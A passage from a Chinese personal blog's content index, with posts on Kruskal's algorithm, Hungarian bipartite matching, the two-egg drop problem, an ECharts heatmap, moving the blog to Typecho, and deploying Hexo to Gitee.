<h2 id="求解："><a href="#求解：" class="headerlink" title="求解："></a>求解：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-01-21 11:11:04</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-10 22:51:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\luo_gu\P3366.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  //利用kruskal算法</span></span></span><br><span class="line"><span class="keyword">int</span> arc[<span class="number">200001</span>][<span class="number">3</span>], n, m;  <span class="comment">// arc的最后一个代表权值，前两个代表邻接点</span></span><br><span class="line"><span class="keyword">int</span> arc_index[<span class="number">200001</span>];  <span class="comment">//存放边的编号,排序后得到的是按照边权值升序的编号</span></span><br><span class="line"><span class="keyword">int</span> anc[<span class="number">200001</span>];  <span class="comment">//并查集辅助数组,存放每一个点属于的集合</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_anc</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (anc[son] == son)</span><br><span class="line">        <span class="keyword">return</span> son;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//压缩路径</span></span><br><span class="line">        anc[son] = find_anc(anc[son]);</span><br><span class="line">        <span class="keyword">return</span> anc[son];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">q_sort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> l = left, r = right, piv = arc_index[left];</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[r]][<span class="number">2</span>] &gt;= arc[piv][<span class="number">2</span>]) r--;</span><br><span class="line">        arc_index[l] = arc_index[r];</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r &amp;&amp; arc[arc_index[l]][<span class="number">2</span>] &lt;= arc[piv][<span class="number">2</span>]) l++;</span><br><span class="line">        arc_index[r] = arc_index[l];</span><br><span class="line">    &#125;</span><br><span class="line">    arc_index[l] = piv;</span><br><span class="line">    q_sort(left, l - <span class="number">1</span>);</span><br><span class="line">    q_sort(r + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) anc[i] = i;  <span class="comment">//刚开始每一个点是单独的集合</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;arc[i][<span class="number">0</span>], &amp;arc[i][<span class="number">1</span>], &amp;arc[i][<span class="number">2</span>]);</span><br><span class="line">        arc_index[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    q_sort(<span class="number">0</span>, m - <span class="number">1</span>);          <span class="comment">//将边的权值排序</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;  <span class="comment">//依次把最小的边进行“并”</span></span><br><span class="line">        <span class="comment">// 如果同属于“祖先”，则跳过</span></span><br><span class="line">        <span class="keyword">if</span> (find_anc(arc[arc_index[i]][<span class="number">1</span>]) == find_anc(arc[arc_index[i]][<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 如果不同，则说明是符合，可以添加</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            anc[find_anc(anc[arc[arc_index[i]][<span class="number">0</span>]])] = arc[arc_index[i]][<span class="number">1</span>];</span><br><span class="line">            sum += arc[arc_index[i]][<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">1 2 2</span></span><br><span class="line"><span class="comment">1 3 8</span></span><br><span class="line"><span class="comment">1 4 3</span></span><br><span class="line"><span class="comment">2 3 4</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title>匈牙利算法求解二分图的最大匹配</title>
    <url>/2020/11/27/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E4%BA%8C%E5%88%86%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE" target="_blank" rel="noopener">二分图</a>：</p>
<p>设<code>G=(V,E)</code>是一个无向图，如果顶点<code>V</code>可分割为两个互不相交的子集<code>(A,B)</code>，并且图中的每条边<code>（i，j）</code>所关联的两个顶点<code>i</code>和<code>j</code>分别属于这两个不同的顶点集<code>(i in A,j in B)</code>，则称图<code>G</code>为一个二分图。</p>
<p>匹配：</p>
<p>给定一个二分图<code>G</code>，在<code>G</code>的一个子图M中，<code>M</code>的边集<code>{E}</code>中的任意两条边都不交汇于同一个结点，则称<code>M</code>是一个匹配。<a id="more"></a></p>
<p>最大匹配：</p>
<p>给定二分图<code>G</code>的所有子图中，满足匹配条件的最大边数子图</p>
<p>关于更多的算法解析，请移步至<a href="https://www.cnblogs.com/cruelty_angel/p/10808729.html" target="_blank" rel="noopener">这位作者的博客</a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2063" target="_blank" rel="noopener">HDU2063过山车</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 501</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> graph[MAX_NUM][MAX_NUM];</span><br><span class="line"><span class="keyword">bool</span> visited[MAX_NUM];</span><br><span class="line"><span class="comment">// 存放每个男生匹配的女生</span></span><br><span class="line"><span class="keyword">int</span> matched[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> girlNum, boyNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">matching</span><span class="params">(<span class="keyword">int</span> girl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> boy = <span class="number">1</span>; boy &lt;= boyNum; boy++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (graph[girl][boy] &amp;&amp; !visited[boy]) &#123;</span><br><span class="line">            visited[boy] = <span class="literal">true</span>;</span><br><span class="line">          	<span class="comment">// 假若该男生未被匹配 或者 该男生匹配的女生 能够可以更换其他男生</span></span><br><span class="line">            <span class="keyword">if</span> (matched[boy] == <span class="number">0</span> || matching(matched[boy]) == <span class="number">1</span>) &#123;</span><br><span class="line">                matched[boy] = girl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Hungary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> girl = <span class="number">1</span>; girl &lt;= girlNum; girl++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visited, <span class="literal">false</span>, <span class="keyword">sizeof</span>(visited));</span><br><span class="line">        sum += matching(girl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k, girl, boy;</span><br><span class="line">    <span class="keyword">while</span> (~(<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;k)) &amp;&amp; k) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girlNum, &amp;boyNum);</span><br><span class="line">        <span class="built_in">memset</span>(graph, <span class="literal">false</span>, <span class="keyword">sizeof</span>(graph));</span><br><span class="line">        <span class="built_in">memset</span>(matched, <span class="number">0</span>, <span class="keyword">sizeof</span>(matched));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girl, &amp;boy);</span><br><span class="line">            graph[girl][boy] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Hungary());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>匈牙利算法</tag>
      </tags>
  </entry>
  <entry>
    <title>博客系统引入ECharts的日历热力图</title>
    <url>/2022/01/25/%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E5%BC%95%E5%85%A5ECharts%E7%9A%84%E6%97%A5%E5%8E%86%E7%83%AD%E5%8A%9B%E5%9B%BE/</url>
    <content><![CDATA[<p>之前我一直中意于<code>Github</code>或者<code>Gitee</code>的个人主页中的提交记录的界面，一直想在博客系统中引入进来，奈何之前一直没空实现，而且不知道有哪些组件或者开源的项目适合借鉴；前不久无意看到<a href="https://echarts.apache.org/zh/index.html" target="_blank" rel="noopener"><code>Echarts</code></a>中的热力图很符合我的预期，就拿了过来。</p>
<a id="more"></a>

<p>得益于前后端分离模式，我直接在前端中引入该组件，后端不需要修改任何一行代码；不过前端我不太了解（其实后端也不咋地，hhhhhhh），调了好久才勉勉强强看得过去，就这样吧，前端太难了啊啊！</p>
<p>之前就了解过一点点<code>Echarts</code>，很喜欢它的动画，后面通过查资料才知道是它是由百度开源的，后来捐给了 <a href="https://baike.baidu.com/item/Apache/8512995" target="_blank" rel="noopener">Apache</a>基金会 ，这让我稍微改变了对百度的看法，反正在我看来，百度跟阿里巴巴、腾讯他们比起来，差太多了，旗下的网盘凭借着用户量大，吃相难看，百度引擎也是差得不得了，搜个东西，广告占了半数，手上的牌都给打烂了……扯远了，<code>Echarts</code>的文档还是写得很详细的，关键是带中文！希望国产的东西越来越多，越来越好吧</p>
<p>不过在我尝试把代码<code>push</code>到<code>github</code>上面的时候，就出现了错误，先是说<code>SSH</code>的问题，网上查了，好像说是因为电脑这边不信任证书，这个前几天我用<code>chrome</code>浏览<code>github</code>时候遇到过了，修复好了，但是不知道为啥<code>git</code>这边也会出错；等我改好了，再尝试的时候又遇到了一个问题，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.</span><br></pre></td></tr></table></figure>

<p>好像是因为原先的密码凭证从2021年8月13日开始就不能用了，必须使用个人访问令牌（<code>personal access token</code>），没办法，去年这段时间忙着复习，没怎么写过代码，或者说没怎么用过<code>git</code>，解决这个也很简单，小伙伴们可以借鉴这个<a href="https://zhuanlan.zhihu.com/p/401978754" target="_blank" rel="noopener">流程</a>.</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Echarts</tag>
        <tag>日历热力图</tag>
      </tags>
  </entry>
  <entry>
    <title>双蛋问题</title>
    <url>/2020/03/22/%E5%8F%8C%E8%9B%8B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>昨天看了李永乐老师的<a href="https://www.bilibili.com/video/av96214853" target="_blank" rel="noopener">视频</a>，想着利用编程实现，想着想着就动起手来了。</p>
<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>你有两个鸡蛋，楼层有一百层，这座楼有一个<strong>临界点</strong>，即从高于（含该楼层）高楼层往下扔鸡蛋，鸡蛋会碎，低于</p>
<p>该楼层，无论扔几次都不会碎（~~忽略物理因素），问你最少需要尝试几次，<strong>一定</strong>可以确定该临界楼层。<a id="more"></a></p>
<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>一层一层地尝试，最好的情况下只需仍一次，最坏的情况是100次，即答案是在[1,100]，即最终答案是100次。</p>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>二分法，即第一个鸡蛋我不从第一层开始，我从第50（100的一半）层开始，要是鸡蛋碎了，临界楼层就在[1,50]之间，接着用解法一的方式去尝试；要是不碎，说明临界楼层就在[51,100]之间，继续从75层开始，然后又会出现两种情况，重复上述过程。即第一个鸡蛋是用于确定区间，第二个鸡蛋是用于确定临界楼层。在这种情况下最坏情况下需要<strong>1+49=50</strong>次，最好的情况是<strong>8</strong>次（依次扔的楼层是50，75，87，93，96，98，99，100），即答案是在[8,50],最终答案是50.</p>
<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><p>经过上面的尝试，我们发现，最坏情况下和最好情况下，需要的次数跨度太大了，我们可以不可以尝试着一种方案，使得最坏和最好的情况下使用次数相差最小呢？如何做到相差最小呢？那我只要两个鸡蛋所需扔的次数之和趋向于一个常数，就可以了。假设第一个鸡蛋第一次在第n层扔，假如鸡蛋碎了，第二个鸡蛋最坏情况需要扔n-1次，总次数是（1+n-1）次；假如没碎，第一个鸡蛋就可以再选择一个楼层来确定区间，那选哪一层呢？答案是第[n+(n-1)]层，假如碎了，第二个鸡蛋就从第n层开始往上寻找答案，最坏情况需要仍n-2次，即总次数是[2+(n-2)]次；假如没碎，第一个鸡蛋接着从第[n+(n-1)+(n-2)]层开始扔，重复上述过程，最坏情况下是：第一个鸡蛋扔的楼层是n，n-1，n-2，n-3，……，1，只需要[n+(n-1)+(n-2)+……+1]&gt;=100，将求得的n向下求整即可，此时n=14。即最终答案是14，即<strong>14次尝试，一定可以确定该临界值。</strong></p>
<h2 id="普遍化"><a href="#普遍化" class="headerlink" title="普遍化"></a>普遍化</h2><p>假如楼层数是m，鸡蛋数是n呢，对于某一个组合（m，n），怎样快速地得到答案呢？我们可以先画出一张表</p>
<table>
<thead>
<tr>
<th>下面是楼层数m，右边是鸡蛋数n</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><span color="##ff0000">1</span></td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>6</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>对于最左边和最上边，我们很容易可以填好，对于其他情况呢？设T（m，n）表示拥有n个蛋，需要确定m层楼的临界层的最小尝试次数。假设手上的第一个鸡蛋在第k层楼扔</p>
<ul>
<li>假如碎了，相当于鸡蛋少了，临界楼层在第k层下面，需要的次数就是{T（k-1，n-1）+1}</li>
<li>假如不碎，相当于手上的鸡蛋数没变，而且需要确定的楼层数也减少了，答案就是{T（m-k，n）+1}</li>
</ul>
<p>对于这两种情况，要么是使得鸡蛋数减少了，要么使得楼层数减少了，二者的取值有可能不一样，为了确保一定能确定出来，我们取最大值，我们记为T<sub>k</sub> 。那k的取值又该如何选择呢？我们不难发现，k可以从<strong>1</strong>取到<strong>m</strong>，都会对应一个T<sub>k</sub> ，我们只要选出最小的值即可。有同学可能会疑问，上面是选择最大值，这里为什么选择最小值呢？是因为这里的k是我们自己选择的，但是选好了k后，鸡蛋碎不碎我们无法预测，因此上面选择最大值，这里选择最小值。因此状态转移方程就是</p>
<p>T（m，n）= min(T<sub>k</sub>  ,k=1,2,3,……,m，T<sub>k</sub>={max[T（m，n-1）,T（m-k，n）]+1}</p>
<p>因此填表的方式就是以列为主序，从上往下，下面给出代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-22 15:44:41</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-22 15:56:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a, b) a &gt; b ? a : b</span></span><br><span class="line"><span class="keyword">int</span> T[<span class="number">100</span>][<span class="number">100</span>], egg, <span class="built_in">floor</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m, n, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;<span class="built_in">floor</span>, &amp;egg);</span><br><span class="line">    <span class="comment">//两个循环用于初始化</span></span><br><span class="line">    <span class="keyword">for</span> (m = <span class="number">1</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">        T[m][<span class="number">1</span>] = m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt;= egg; n++) &#123;</span><br><span class="line">        T[<span class="number">1</span>][n] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 填表开始</span></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">2</span>; n &lt;= egg; n++)</span><br><span class="line">        <span class="keyword">for</span> (m = <span class="number">2</span>; m &lt;= <span class="built_in">floor</span>; m++) &#123;</span><br><span class="line">            <span class="keyword">int</span> minTk = <span class="number">32767</span>, Tk;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= m; k++) &#123;</span><br><span class="line">                <span class="comment">// 蛋碎了，则还需尝试k-1次，不碎还需m-k次</span></span><br><span class="line">                Tk = <span class="built_in">max</span>(T[k - <span class="number">1</span>][n - <span class="number">1</span>], T[m - k][n]);</span><br><span class="line">                Tk++;</span><br><span class="line">                minTk = minTk &lt; Tk ? minTk : Tk;</span><br><span class="line">            &#125;</span><br><span class="line">            T[m][n] = minTk;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>博客转移</title>
    <url>/2020/03/26/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E7%A7%BB/</url>
    <content><![CDATA[<p>现在是2020年3月26日，前几天搭建好了typecho的博客，把Hexo下的文章全都转移了过去，接着又是换主题，小修改，终于算是满意了，我为什么要进行博客转移？</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因<a id="more"></a></h2><p>最近新冠肺炎不断肆虐各国各地区，各地都在积极采取措施，在这里我要感谢奋斗在一线的医生护士们，你们辛苦了，你们是最棒的！阿里云为了鼓励大家利用在家的时间多多学习，推出了<a href="https://developer.aliyun.com/adc/student/" target="_blank" rel="noopener">高校学生“在家实践”计划活动</a>,，只要是在校大学生，通过测试就可以领取六个月的服务器ECS，2核cpu+4GB内存+1M宽带+40GB的系统盘，这个配置算下来应该也要五六百吧人民币。但是我领取了以后也不知道拿来干嘛，我之前搭建的Hexo博客不需要服务器就可以搭建，所以服务器就一直闲置着。前几天刚好看到一个IT之家网友分享的typecho博客，然后就想搭建一个，也不算是浪费了服务器。然后一番折腾终于搭建好了，主题用的是<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a>。但是截止到今天，我的域名备案还没通过，所以typecho的博客还是利用我的服务器IP来进行访问。</p>
<p>这是我的<a href="http://47.92.93.189/" target="_blank" rel="noopener">typecho博客</a>，主题是<a href="https://eriri.ink/archives/Typecho-Theme-Aria.html" target="_blank" rel="noopener">Aria</a></p>
<p>这是我的<a href="https://yalexin.gitee.io/">Hexo博客</a>，主题是<a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">Next</a></p>
<p>目前是文章两边同时更新，所以就相当于同一个博客不同主题吧（<del>~</del>）。</p>
<h2 id="这二者博客的区别"><a href="#这二者博客的区别" class="headerlink" title="这二者博客的区别"></a>这二者博客的区别</h2><ul>
<li><p>Hexo</p>
<ul>
<li>它基于node.js，是一个静态博客，关于什么是静态web和动态web，<a href="https://blog.csdn.net/qq_33915826/article/details/81172555" target="_blank" rel="noopener">这里</a>有说明，Hexo比较轻量，访问速度比较快，托管方便，几乎不用担心数据丢失的问题，在没有服务器情况下也可以搭建。</li>
<li>但是每次发布文章都要输入命令，重新渲染成HTML文件</li>
<li>移动端写文章不太方便</li>
</ul>
</li>
<li><p>Typecho</p>
<ul>
<li>它基于PHP+ MySQL 数据库 ，只需要仅仅七张数据表，以及不足500KB的代码文件，就可以构建博客框架，写文章十分方便，支持原生Markdown语法，只要有网络就可以进行发布文章，修改文章，删除文章等操作。</li>
<li>需要额外的服务器，域名（当然了，也可以用服务器的ip来访问）等</li>
<li>模板插件比较少</li>
</ul>
</li>
</ul>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>目前重心主要放在Typecho上面，等哪一天没钱续费服务器，再转回Hexo，反正目前两边都同一时间更新，不用担心数据不同步的问题，但是可能评论迁移比较困难。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
  </entry>
  <entry>
    <title>搭建Hexo博客并部署到码云</title>
    <url>/2020/02/22/%E5%8F%91%E5%B8%83%E5%8D%9A%E6%96%87/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我为什么要搭建博客？说实话我个人记忆力比较差，学过的东西经常会很快忘记，我自己又不爱做笔记，况且假如写在了笔记本上，笔记本又会被我弄丢，所以想到了把学过的东西记在博客上这种方法，但是我又不会web开发，刚好在别的地方了解到有hexo等的开源博客框架，心血来潮，趁着放寒假的时间就搭建了起来。</p>
<h2 id="下载安装Node-js"><a href="#下载安装Node-js" class="headerlink" title="下载安装Node.js"></a>下载安装Node.js</h2><p>从<a href="https://nodejs.org/en/" target="_blank" rel="noopener">官网</a>下载安装，安装完毕后在终端输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<p>假如出现版本号则说明安装成功，否则需要手动在系统的环境变量下的Path的值中添加node的安装路径。</p>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>这个步骤应该不难，网上的教程实在是太多太详细了。</p>
<h2 id="安装hexo相关文件："><a href="#安装hexo相关文件：" class="headerlink" title="安装hexo相关文件："></a>安装hexo相关文件：</h2><p>在一个你喜欢的地方，新建一个文件夹，最好这个路径不要包含中文路径，在cmd窗口输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<h2 id="初始化博客文件夹："><a href="#初始化博客文件夹：" class="headerlink" title="初始化博客文件夹："></a>初始化博客文件夹：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init blog</span><br></pre></td></tr></table></figure>
<h2 id="进入博客文件夹："><a href="#进入博客文件夹：" class="headerlink" title="进入博客文件夹："></a>进入博客文件夹：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd blog</span><br></pre></td></tr></table></figure>
 <a id="more"></a> 

<h2 id="安装插件："><a href="#安装插件：" class="headerlink" title="安装插件："></a>安装插件：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<h2 id="新建一篇文章命令："><a href="#新建一篇文章命令：" class="headerlink" title="新建一篇文章命令："></a>新建一篇文章命令：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new "My New Post"</span><br></pre></td></tr></table></figure>

<h2 id="启动服务预览"><a href="#启动服务预览" class="headerlink" title="启动服务预览"></a>启动服务预览</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>然后在本地浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ，如果一切顺利，那么就可以出现你的博客了。</p>
<h2 id="部署到第三方平台"><a href="#部署到第三方平台" class="headerlink" title="部署到第三方平台"></a>部署到第三方平台</h2><p>当然了，我们自己的博客不仅仅是想让自己看，还想着通过网络，让更多的人看到，我们就可以借助第三方平台的page服务来展示我们的静态网站了，你可以通过GitHub，码云，coding等，我这里用来码云。</p>
<h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>注册好码云后，新建一个仓库，将仓库的地址（可以是HTTPS形式的，也可以是SSH形式的，我的是https）复制，打开博客文件夹下的_config.yml文件（theme/theme_name/下也有一个，不要混淆），将刚刚复制好的地址粘贴到gitee的值，并在后面加上master分支：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span>  </span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">https://gitee.com/xxxxx/xxxx.git,master</span></span><br></pre></td></tr></table></figure>

<h3 id="与远程仓库连接"><a href="#与远程仓库连接" class="headerlink" title="与远程仓库连接"></a>与远程仓库连接</h3><p>在刚刚打开的文件夹中打开cmd终端，输入下面命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name空格+你的码云的名字</span><br><span class="line">git config --global user.email空格+你的码云绑定的邮箱</span><br></pre></td></tr></table></figure>

<h3 id="安装Git部署插件"><a href="#安装Git部署插件" class="headerlink" title="安装Git部署插件"></a>安装Git部署插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>生成静态网页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>

<p>推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>接着到码云平台，打开你刚刚建好的仓库，如果仓库里边出现新的东西，说明部署成功了，接着我们依次点击 服务-&gt;gite pages -&gt; 开启，然后打开平台给我们的网址，就可以访问我们的博客啦！</p>
<p>后期可以通过更换主题来增加美观度，主题可以在<a href="https://hexo.io/" target="_blank" rel="noopener">hexo官网</a>下载，也可以在GitHub下载，下载后在博客目录下的配置文件_config.yml中修改主题的名字</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="comment"># your theme name</span></span><br></pre></td></tr></table></figure>


<p>并将你下载的主题文件夹放到博客目录下的themes文件夹中就可以了。</p>
